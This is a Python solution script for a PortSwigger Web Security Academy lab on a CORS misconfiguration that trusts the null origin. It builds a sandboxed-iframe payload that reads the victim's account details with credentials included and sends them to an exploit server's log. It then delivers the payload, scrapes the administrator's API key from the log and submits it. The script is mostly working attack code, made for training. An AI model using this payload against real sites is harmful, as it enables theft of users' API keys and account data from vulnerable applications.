#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 20/10/2023
#
# Lab: CORS vulnerability with trusted null origin
#
# Steps: 1. Deliver the exploit to the victim
#        2. Fetch your exploit server log page
#        3. Extract the administrator's API key from the logs
#        4. Submit the solution
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a6f001c04c6b6c7841dc721003e0092.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0ac3009a049bb64d84a1c617015500f3.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

# payload that uses CORS to retrieve the administrator's API key
# this payload uses the fetch API instead of XMLHttpRequest API
payload = f"""<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
                fetch('{lab_url}/accountDetails', {{
                method: 'GET',
                credentials: 'include'
                }})
                .then(response => response.text())
                .then(data => {{
                    fetch('{exploit_server_url}/log?key=' + data);
                }});
                </script>"></iframe>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")

try:
    # fetch the log page
    logs = requests.get(f"{exploit_server_url}/log")

except:
    print(Fore.RED + "[!] Failed to fetch the log page through exception")
    exit(1)

print(Fore.WHITE + "â¦—2â¦˜ Fetching your exploit server log page.. " + Fore.GREEN + "OK")

# extract the API key
api_key = re.findall("apikey%22:%20%22(.*)%22,", logs.text)[0]

print(Fore.WHITE + "â¦—3â¦˜ Extracting the administrator's API key from the logs.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + api_key )

# set answer  
data = {
    "answer": api_key
}

try:
    # submit the solution
    requests.post(f"{lab_url}/submitSolution", data)
    
except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "â¦—4â¦˜ Submitting the solution.. " + Fore.GREEN + "OK") 
print(Fore.WHITE + "ðŸ—¹ Check your browser, it should be marked now as " + Fore.GREEN + "solved")



